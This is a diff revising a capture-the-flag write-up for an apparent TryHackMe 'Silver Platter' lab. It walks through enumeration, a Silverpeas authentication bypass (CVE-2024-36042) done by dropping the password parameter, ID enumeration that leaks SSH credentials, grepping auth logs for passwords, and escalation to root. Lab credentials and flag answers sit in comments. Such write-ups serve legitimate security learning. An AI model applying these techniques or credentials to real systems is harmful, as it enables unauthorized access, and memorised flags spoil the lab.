@@ -60,11 +60,11 @@ Since a web service is available on port 80, let take a look at web.
 
 ![image](https://github.com/user-attachments/assets/c4748ed9-d6ae-43e9-a79a-db1dd7698d48)
 
-After navigating a little through it, I came accros something interesting. In /contact, there some content that leaks the username: scr1ptkiddy. Maybe it will be useful for brute-forcing a form or something, at least that’s what I though initially, but this wasn’t the case. Some other crucial info is mentioned, but I’ll come to it later.
+After navigating a little through the application, I came across something interesting. In /contact, there is some content that leaks the username: `scr1ptkiddy`. I initially thought this might be useful for brute-forcing a form or something, but that wasn't the case. Some other crucial info is mentioned, but I’ll come to that later.
 
 ![image](https://github.com/user-attachments/assets/ff2b6fc3-8f54-4fda-99d8-f0c5da2bf76c)
 
-I didn't find anything good let Enemurate the directory.
+I didn't find anything good, so I decided to enumerate.
 ```
 death@esther:~$ dirsearch -u 10.10.12.168 
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -96,8 +96,10 @@ Let Take a look at both directories
 
 ![image](https://github.com/user-attachments/assets/fc342ed8-cec3-47ae-ad7c-6c37ee1d5d72)
 
-Both are forbidden let Enemurate http-proxy maybe we could find somthing usefull
+Both `/assets` and `/images` were forbidden
 
+#### Enumerating HTTP Proxy
+Since nothing significant was found, I decided to enumerate the HTTP proxy on port `8080`.
 ```
 death@esther:~$ dirsearch -u 10.10.12.168:8080
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -124,19 +126,20 @@ Target: http://10.10.12.168:8080/
 Task Completed
 death@esther:~$ 
 ```
-Ok when i try to take a look at website it also forbidden 
+
+The `/website` directory was forbidden,
 
 ![image](https://github.com/user-attachments/assets/0915906f-81bb-44e3-b0a4-6538abb923fc)
 
-And the `/noredirect.html` is also forbidden
+And `/noredirect.html` was also forbidden. This seemed like an intentional redirection trap to mislead the Us.
 
 ![image](https://github.com/user-attachments/assets/e2d8df58-c4dc-41b8-b5ec-eb887f61c1bc)
 
-It's kind a sharp trick to manuplate a human mind on fixed path when i notice this first i just ignre and focus on the username but At this point, I knew I needed to change my approch and thought about enumerating parameters,
+It's a clever trick to manipulate the human mind into following a fixed path. When I first noticed this, I ignored it and focused on the username. But at this point, I knew I had to change my approach and started thinking about enumerating parameters.
 
 ![image](https://github.com/user-attachments/assets/dcdd74ce-bb3e-4b40-b39d-4f762d9f8da9)
 
-BUT before that, I felt I should check again the website on port 80. Looking again at /contact, I noticed an interesting name: Silverpeas more exactly., when we create any project name on github the project is be same name as the repo named and the user is a kind a differnt things so i started enemurateing the     
+Looking again at `/contact`, I noticed an interesting name: `Silverpeas`. This suggested that the application might be based on the Silverpeas CMS.
 
 ```
 death@esther:~$ dirsearch -u 10.10.12.168:8080/silverpeas
@@ -379,59 +382,65 @@ Target: http://10.10.12.168:8080/
 Task Completed
 death@esther:~$
 ```
-So here is the default Login page,And intreasting thing is the version of the website is mentioned already we can search for any exploit for this
+
+### Exploitation
+
+#### Identifying the Vulnerability
+
+Upon reaching the default login page, I noticed something interesting—the version of the website was already displayed. This allowed me to search for any known exploits related to this version.
 
 ![image](https://github.com/user-attachments/assets/1a1d8c9d-7d21-49ad-be4f-79cee418538f)
 
-CVE-2024-36042As i check for the version there is an `CVE-2024-36042` Silverpeas CRM - Authentication Bypass. I found this repo that describe this things in breef [CVE-2024-36042](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d)
+After checking, I found that CVE-2024-36042 affects Silverpeas CRM and allows for authentication bypass. A detailed description of the exploit can be found in this repository: [CVE-2024-36042](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d)
 
-### Exploitation
-Let Use burpsuite to Intercept the request
+Exploiting the Vulnerability
+Using Burp Suite, I intercepted the login request.
 
-As we know the username already `scr1ptkiddy` let try to login
+Since we already know the username is `scr1ptkiddy` , let's attempt to log in.
 
 ![image](https://github.com/user-attachments/assets/96d5f3ff-244b-46af-8013-35742a4a277d)
 
-Remove the Password Parameter and Follow The Redirection
+To exploit the authentication bypass, I removed the password parameter and followed the redirection.
 
 ![image](https://github.com/user-attachments/assets/fd8c4c1d-f6f0-438e-9537-79bb9bc06890)
 
-Again Follow the Redirection
+After another redirection...
 
 ![image](https://github.com/user-attachments/assets/2d3854fd-999e-4b3b-86f8-151fd0844938)
 
-It hit to 200
+I finally hit a 200 OK response.
 
 ![image](https://github.com/user-attachments/assets/d891681b-1638-47e5-bc74-5dfd4ba404c5)
 
-Reqest that session in browser and here we go
+Requesting this session in the browser, and we’re in!
 
 ![image](https://github.com/user-attachments/assets/89b4cca4-5fe2-41d2-849e-3284d3f5ccba)
 
-There so as i go thorugh the website i found there are 2 more user admin and manager and there is an unread message form manager let take a look at notification
+While navigating through the website, I found two more users: admin and manager. Additionally, there was an unread message from the manager. Let's take a look at the notifications.
 
 ![image](https://github.com/user-attachments/assets/45b127f1-bf61-4a1c-b76f-79e821852ba3)
 
-Let copy the URL and past it on browser
+Copying the notification URL and pasting it into the browser:
 
 ![image](https://github.com/user-attachments/assets/fd635ccb-497d-4561-b5c2-0866923a8472)
 
-There is an id let try to change id  maybe we get somthing more 
+##### ID Enumeration
+The request contained an ID parameter. By iterating through IDs (0-6), I discovered additional messages.
 
-When i go through form 0-6 i found other message as well but at 6 we got ssh user:password 
+At ID 6, I found credentials for SSH access!
 
 ![image](https://github.com/user-attachments/assets/5b9595a5-f09e-4996-bdeb-b0f043f81bc5)
 
 <!-- 
-Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 
+Dude, how do you always forget the SSH password?  
+Use a password manager and quit using your silly sticky notes.  
 
-Username: tim
-
-Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+Username: tim  
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol  
 -->
-
-Post Exploitation
-Let logged in using ssh
+### Post Exploitation
+#### Gaining SSH Access
+Now that we have valid SSH credentials, let's log in as `tim`.
 ```
 death@esther:~$ ssh tim@10.10.12.168
 The authenticity of host '10.10.12.168 (10.10.12.168)' can't be established.
@@ -440,6 +449,9 @@ This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.12.168' (ED25519) to the list of known hosts.
 tim@10.10.12.168's password: 
+```
+After successful authentication, we gain access to the system:
+```
 Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -457,45 +469,51 @@ Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
 
 Last login: Wed Dec 13 16:33:12 2023 from 192.168.1.20
 tim@silver-platter:~$
+```
+Checking user privileges:
+```
 tim@silver-platter:~$ id
 uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
 ```
-
-User Flag.txt
+### Capturing the User Flag
+Navigating to Tim's home directory, we find the user.txt flag:
+```
+tim@silver-platter:~$ cat user.txt
+THM{c4c***************************b}
+```
 <!--
 THM{c4ca4238a0b923820dcc509a6f75849b}
 -->
-```
-tim@silver-platter:~$ cat user.txt 
-THM{c4c***************************b}
-tim@silver-platter:~$ 
-```
 
-There are 2 home directories that mean 2 users
+### Post-Exploitation
+Checking User Privileges
+
+Listing home directories reveals two users:
 ```
 tim@silver-platter:~$ ls /home/
 tim  tyler
+```
+Trying to access Tyler's home directory:
+
+```
 tim@silver-platter:~$ cd /home/tyler/
 -bash: cd: /home/tyler/: Permission denied
-tim@silver-platter:~$
 ```
-We dont have permission to check for user ```tyler```
-Let see can we run any commands as suda
+We lack permissions to access Tyler's directory.
+
+##### Checking Sudo Privileges
 ```
 tim@silver-platter:~$ sudo -l
 [sudo] password for tim: 
 Sorry, user tim may not run sudo on silver-platter.
-tim@silver-platter:~$ 
 ```
-Our tim is not a sudore user
-
-### Post-Exploitation
-
-Let check for authentication logs
+Since `tim` is not a sudo user, we need an alternative method to escalate privileges.
+#### Credential Discovery
+Checking authentication logs for stored credentials:
 ```
 cat /var/log/auth* | grep -a -i pass
 ```
-We got the pass
+We find Tyler’s password stored in logs!
 
 ![image](https://github.com/user-attachments/assets/26ae0276-9d51-427d-8220-e5a0c77d05ce)
 
@@ -503,26 +521,34 @@ We got the pass
 pass: _Zd_zx7N823/
 -->
 
-We got the root, 
+Switching to Tyler
+Using the discovered credentials, we switch to Tyler's account:
 ```
 tim@silver-platter:~$ su tyler
 Password: 
 tyler@silver-platter:/home/tim$ 
 ```
-We can directly switch to root with tyler password
+Now, let's check if Tyler has sudo privileges:
+
 ```
 tyler@silver-platter:/home/tim$ sudo -l
 Matching Defaults entries for tyler on silver-platter:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
 User tyler may run the following commands on silver-platter:
-    (ALL : ALL) ALL
+    (ALL : ALL) ALL 
+```
+Since Tyler can execute all commands as root, we can escalate privileges.
+
+### Root Access
+Executing sudo su to gain root access:
+We're now root! 🎉
+```
 tyler@silver-platter:/home/tim$ sudo su
 [sudo] password for tyler: 
-root@silver-platter:/home/tim# 
+root@silver-platter:/home/tim#
 ```
-Root Flag.txt
-
+### Capturing the Root Flag
 ```
 root@silver-platter:/home/tim# cat /root/root.txt 
 THM{0**************************6}
@@ -531,3 +557,4 @@ root@silver-platter:/home/tim#
 <!--
 THM{098f6bcd4621d373cade4e832627b4f6}
 -->
+#### Done
